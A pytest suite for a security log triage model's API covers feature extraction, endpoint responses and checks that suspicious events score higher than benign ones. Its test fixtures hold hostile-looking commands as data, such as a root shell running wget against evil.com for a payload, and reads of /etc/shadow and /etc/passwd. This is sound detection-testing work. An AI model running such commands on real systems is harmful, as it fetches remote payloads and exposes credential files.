"""
Comprehensive tests for the Phase 2B triage prediction API.

Three layers of coverage:
  Layer 1 -- Pure unit tests on helper functions (no model, no HTTP)
  Layer 2 -- API endpoint tests via FastAPI TestClient (model loaded from disk)
  Layer 3 -- Directional sanity checks (suspicious events must score higher than benign)

Layer 3 tests are model-agnostic: they assert RELATIVE ordering, not specific
probability values. This means they stay valid even after the model is retrained.

REQUIRES: .joblib files in services/triage-model/ -- run train.py first.

HOW TO RUN:
    pytest services/triage-model/test_predict.py -v
"""

import math
import pytest
from fastapi.testclient import TestClient

from predict import (
    app,
    _shannon_entropy,
    _extract_features,
    _SUS_THRESHOLD,
    _EVIL_THRESHOLD,
    _FEATURE_COLS,
)

client = TestClient(app)


# ---------------------------------------------------------------------------
# Shared event fixtures
# ---------------------------------------------------------------------------

BENIGN_DNS = {
    "log_type": "dns",
    "attributes": {
        "dns_query": "ssm.us-east-2.amazonaws.com",
        "dns_response_code": 0,
    },
}

SUSPICIOUS_KERNEL = {
    "log_type": "deep_kernel",
    "attributes": {
        "user_id": 0,
        "return_value": 0,
        "args": "/bin/bash -c wget http://evil.com/payload",
    },
}

BENIGN_KERNEL = {
    "log_type": "deep_kernel",
    "attributes": {
        "user_id": 1000,
        "return_value": 0,
        "args": "/usr/bin/vim /home/user/notes.txt",
    },
}


# ===========================================================================
# LAYER 1 -- Pure unit tests: _shannon_entropy
# ===========================================================================

class TestShannonEntropy:

    def test_empty_string_returns_zero(self):
        assert _shannon_entropy("") == 0.0

    def test_single_repeated_character_returns_zero(self):
        # "aaaa" has only one distinct character -- no randomness at all.
        assert _shannon_entropy("aaaa") == 0.0

    def test_two_equal_characters_returns_one_bit(self):
        # "ab": two chars, equal probability 0.5 each.
        # Entropy = -(0.5*log2(0.5) + 0.5*log2(0.5)) = 1.0 bit.
        result = _shannon_entropy("ab")
        assert abs(result - 1.0) < 1e-9

    def test_normal_domain_has_low_entropy(self):
        # "google.com" is predictable -- repeating chars, standard pattern.
        result = _shannon_entropy("google.com")
        assert result < 3.5

    def test_dga_looking_string_has_high_entropy(self):
        # Random-looking hex string -- all chars roughly equally distributed.
        result = _shannon_entropy("x7f3a9b2c4e1d8f0a")
        assert result > 3.5

    def test_entropy_is_non_negative(self):
        for s in ["hello", "world", "abc123", "a" * 100]:
            assert _shannon_entropy(s) >= 0.0


# ===========================================================================
# LAYER 1 -- Pure unit tests: _extract_features (DNS)
# ===========================================================================

class TestExtractFeaturesDns:

    def test_successful_dns_response_sets_failed_to_zero(self):
        feats = _extract_features("dns", {"dns_query": "google.com", "dns_response_code": 0})
        assert feats["feat_dns_failed"] == 0

    def test_failed_dns_response_sets_failed_to_one(self):
        # NXDOMAIN is response code 3 -- domain does not exist.
        feats = _extract_features("dns", {"dns_query": "notreal.xyz", "dns_response_code": 3})
        assert feats["feat_dns_failed"] == 1

    def test_none_response_code_treated_as_failed(self):
        feats = _extract_features("dns", {"dns_query": "test.com", "dns_response_code": None})
        assert feats["feat_dns_failed"] == 1

    def test_query_length_matches_string_length(self):
        query = "ssm.us-east-2.amazonaws.com"
        feats = _extract_features("dns", {"dns_query": query, "dns_response_code": 0})
        assert feats["feat_dns_query_length"] == len(query)

    def test_subdomain_count_counts_dots(self):
        feats = _extract_features("dns", {"dns_query": "a.b.c.com", "dns_response_code": 0})
        assert feats["feat_dns_num_subdomains"] == 3

    def test_empty_query_produces_zero_features(self):
        feats = _extract_features("dns", {"dns_query": "", "dns_response_code": 0})
        assert feats["feat_dns_query_length"] == 0
        assert feats["feat_dns_query_entropy"] == 0.0
        assert feats["feat_dns_num_subdomains"] == 0

    def test_missing_query_does_not_crash(self):
        feats = _extract_features("dns", {"dns_response_code": 0})
        assert feats["feat_dns_query_length"] == 0

    def test_kernel_features_are_zero_for_dns_event(self):
        feats = _extract_features("dns", {"dns_query": "test.com", "dns_response_code": 0})
        assert feats["feat_is_root_user"] == 0
        assert feats["feat_args_has_shell"] == 0
        assert feats["feat_args_has_network"] == 0


# ===========================================================================
# LAYER 1 -- Pure unit tests: _extract_features (kernel / host)
# ===========================================================================

class TestExtractFeaturesKernel:

    def test_root_user_sets_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": ""})
        assert feats["feat_is_root_user"] == 1

    def test_non_root_user_clears_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 1000, "return_value": 0, "args": ""})
        assert feats["feat_is_root_user"] == 0

    def test_negative_return_value_sets_failed_flag(self):
        # -1 = EPERM (permission denied). Negative = kernel error code.
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": -1, "args": ""})
        assert feats["feat_return_failed"] == 1

    def test_zero_return_value_clears_failed_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": ""})
        assert feats["feat_return_failed"] == 0

    def test_positive_return_value_clears_failed_flag(self):
        # Positive values = success with data (bytes read, file descriptor, child PID).
        # This is the key reason the check is rv < 0, not rv != 0.
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 4096, "args": ""})
        assert feats["feat_return_failed"] == 0

    def test_bash_shell_detected(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "/bin/bash -c ls"})
        assert feats["feat_args_has_shell"] == 1

    def test_sh_shell_detected(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "/bin/sh script.sh"})
        assert feats["feat_args_has_shell"] == 1

    def test_powershell_detected(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "powershell -enc abc"})
        assert feats["feat_args_has_shell"] == 1

    def test_normal_binary_not_flagged_as_shell(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "/usr/bin/vim file.txt"})
        assert feats["feat_args_has_shell"] == 0

    def test_wget_sets_network_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "wget http://example.com"})
        assert feats["feat_args_has_network"] == 1

    def test_curl_sets_network_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "curl -s http://example.com"})
        assert feats["feat_args_has_network"] == 1

    def test_etc_passwd_sets_sensitive_path_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "cat /etc/passwd"})
        assert feats["feat_args_has_sensitive_path"] == 1

    def test_proc_pid_sets_sensitive_path_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "cat /proc/1234/maps"})
        assert feats["feat_args_has_sensitive_path"] == 1

    def test_normal_path_clears_sensitive_flag(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": "/home/user/documents/report.txt"})
        assert feats["feat_args_has_sensitive_path"] == 0

    def test_string_user_id_handled_without_crash(self):
        # Callers might send user_id as a string. The try/except in _extract_features
        # must catch ValueError and fall back to uid=-1 (non-root).
        feats = _extract_features("deep_kernel", {"user_id": "notanumber", "return_value": 0, "args": ""})
        assert feats["feat_is_root_user"] == 0

    def test_dns_features_are_zero_for_kernel_event(self):
        feats = _extract_features("deep_kernel", {"user_id": 0, "return_value": 0, "args": ""})
        assert feats["feat_dns_query_length"] == 0
        assert feats["feat_dns_failed"] == 0


# ===========================================================================
# LAYER 2 -- API endpoint tests
# ===========================================================================

class TestHealth:

    def test_returns_200(self):
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_status_is_ok(self):
        data = client.get("/health").json()
        assert data["status"] == "ok"

    def test_sus_threshold_present_and_positive(self):
        data = client.get("/health").json()
        assert "sus_threshold" in data
        assert data["sus_threshold"] > 0

    def test_evil_threshold_present_and_positive(self):
        data = client.get("/health").json()
        assert "evil_threshold" in data
        assert data["evil_threshold"] > 0

    def test_feature_count_matches_expected(self):
        data = client.get("/health").json()
        assert data["feature_count"] == len(_FEATURE_COLS)


class TestPredictResponseShape:

    def test_returns_200_for_dns_event(self):
        resp = client.post("/predict", json=BENIGN_DNS)
        assert resp.status_code == 200

    def test_returns_200_for_kernel_event(self):
        resp = client.post("/predict", json=SUSPICIOUS_KERNEL)
        assert resp.status_code == 200

    def test_response_has_all_required_fields(self):
        data = client.post("/predict", json=BENIGN_DNS).json()
        for field in ["sus_probability", "evil_probability", "sus_flag", "evil_flag",
                      "sus_threshold", "evil_threshold"]:
            assert field in data, f"Missing field: {field}"

    def test_probabilities_are_between_zero_and_one(self):
        data = client.post("/predict", json=SUSPICIOUS_KERNEL).json()
        assert 0.0 <= data["sus_probability"] <= 1.0
        assert 0.0 <= data["evil_probability"] <= 1.0

    def test_thresholds_in_response_match_loaded_values(self):
        data = client.post("/predict", json=BENIGN_DNS).json()
        assert data["sus_threshold"] == _SUS_THRESHOLD
        assert data["evil_threshold"] == _EVIL_THRESHOLD

    def test_sus_flag_is_bool(self):
        data = client.post("/predict", json=BENIGN_DNS).json()
        assert isinstance(data["sus_flag"], bool)

    def test_evil_flag_is_bool(self):
        data = client.post("/predict", json=BENIGN_DNS).json()
        assert isinstance(data["evil_flag"], bool)


class TestPredictFlagBehavior:

    def test_benign_dns_clears_both_flags(self):
        data = client.post("/predict", json=BENIGN_DNS).json()
        assert data["sus_flag"] is False
        assert data["evil_flag"] is False

    def test_benign_kernel_clears_both_flags(self):
        data = client.post("/predict", json=BENIGN_KERNEL).json()
        assert data["sus_flag"] is False
        assert data["evil_flag"] is False

    def test_suspicious_kernel_sets_sus_flag(self):
        # root + bash + wget -- strong sus signal, model returns ~0.99.
        data = client.post("/predict", json=SUSPICIOUS_KERNEL).json()
        assert data["sus_flag"] is True

    def test_flag_is_consistent_with_probability_and_threshold(self):
        # sus_flag must always equal (sus_probability >= sus_threshold).
        # This test is model-agnostic: it checks the flag logic, not the score.
        for event in [BENIGN_DNS, BENIGN_KERNEL, SUSPICIOUS_KERNEL]:
            data = client.post("/predict", json=event).json()
            assert data["sus_flag"] == (data["sus_probability"] >= data["sus_threshold"])
            assert data["evil_flag"] == (data["evil_probability"] >= data["evil_threshold"])


class TestEdgeCases:

    def test_unknown_log_type_does_not_crash(self):
        resp = client.post("/predict", json={
            "log_type": "windows_event",
            "attributes": {"user_id": 0}
        })
        assert resp.status_code == 200

    def test_unknown_log_type_clears_both_flags(self):
        # All features default to 0 for unknown types -- no attack pattern matches.
        data = client.post("/predict", json={
            "log_type": "windows_event",
            "attributes": {}
        }).json()
        assert data["sus_flag"] is False
        assert data["evil_flag"] is False

    def test_empty_attributes_does_not_crash(self):
        resp = client.post("/predict", json={"log_type": "deep_kernel", "attributes": {}})
        assert resp.status_code == 200

    def test_missing_attributes_key_does_not_crash(self):
        resp = client.post("/predict", json={"log_type": "dns"})
        assert resp.status_code == 200

    def test_string_user_id_does_not_crash(self):
        resp = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": "notanumber", "return_value": 0, "args": ""}
        })
        assert resp.status_code == 200

    def test_standard_host_log_type_accepted(self):
        resp = client.post("/predict", json={
            "log_type": "standard_host",
            "attributes": {"user_id": 1000, "return_value": 0, "args": "ls -la"}
        })
        assert resp.status_code == 200


# ===========================================================================
# LAYER 3 -- Directional sanity checks (model-agnostic ordering)
# ===========================================================================

class TestDirectionalSanity:

    def test_high_entropy_dns_scores_higher_sus_than_normal_dns(self):
        normal = client.post("/predict", json={
            "log_type": "dns",
            "attributes": {"dns_query": "google.com", "dns_response_code": 0}
        }).json()
        dga = client.post("/predict", json={
            "log_type": "dns",
            "attributes": {"dns_query": "x7f3a9b2c4e1d.ru", "dns_response_code": 0}
        }).json()
        assert dga["sus_probability"] >= normal["sus_probability"]

    def test_failed_dns_scores_higher_sus_than_successful_dns(self):
        success = client.post("/predict", json={
            "log_type": "dns",
            "attributes": {"dns_query": "google.com", "dns_response_code": 0}
        }).json()
        failed = client.post("/predict", json={
            "log_type": "dns",
            "attributes": {"dns_query": "google.com", "dns_response_code": 3}
        }).json()
        assert failed["sus_probability"] >= success["sus_probability"]

    def test_root_user_scores_higher_sus_than_normal_user(self):
        normal_user = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 1000, "return_value": 0, "args": "/bin/bash"}
        }).json()
        root_user = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 0, "return_value": 0, "args": "/bin/bash"}
        }).json()
        assert root_user["sus_probability"] >= normal_user["sus_probability"]

    def test_shell_plus_network_scores_higher_than_no_flags(self):
        benign = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 1000, "return_value": 0, "args": "/usr/bin/vim notes.txt"}
        }).json()
        suspicious = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 0, "return_value": 0, "args": "/bin/bash -c wget http://evil.com"}
        }).json()
        assert suspicious["sus_probability"] > benign["sus_probability"]

    def test_sensitive_path_access_scores_higher_than_normal_path(self):
        normal = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 0, "return_value": 0, "args": "/home/user/file.txt"}
        }).json()
        sensitive = client.post("/predict", json={
            "log_type": "deep_kernel",
            "attributes": {"user_id": 0, "return_value": 0, "args": "cat /etc/shadow"}
        }).json()
        assert sensitive["sus_probability"] >= normal["sus_probability"]
